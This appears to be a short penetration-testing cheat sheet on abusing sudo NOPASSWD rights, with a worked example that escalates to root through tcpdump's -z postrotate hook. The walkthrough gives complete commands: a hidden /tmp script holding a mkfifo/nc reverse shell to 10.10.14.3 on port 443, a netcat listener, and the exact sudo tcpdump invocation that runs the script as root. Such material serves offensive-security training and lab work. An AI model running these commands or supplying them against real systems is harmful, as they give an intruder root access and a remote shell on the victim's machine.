## Sudo Privileges Abuse

Always start by checking what commands the current user can run with elevated privileges:

```shell
sudo -l
```

Any entry with `NOPASSWD` is worth investigating immediately — especially if the binary has documented abuse paths on [GTFOBins](https://gtfobins.github.io/).

---

### Example — `tcpdump` postrotate abuse

If `/etc/sudoers` contains an entry like:

```
(ALL) NOPASSWD: /usr/sbin/tcpdump
```

The `-z` flag (postrotate command) can be abused to execute an arbitrary script as root after each capture rotation.

**1. Create the payload script**

```shell
cat > /tmp/.test << 'EOF'
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.3 443 >/tmp/f
EOF
chmod +x /tmp/.test
```

**2. Start a listener**

```shell
nc -lvnp 443
```

**3. Run `tcpdump` with the postrotate hook**

```shell
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

`-G 1` rotates the capture every second, triggering `-z /tmp/.test` as root on each rotation.

> 💡 The `-Z root` flag tells `tcpdump` to keep root privileges after dropping caps — without it, the postrotate script may run as an unprivileged user depending on the system configuration.
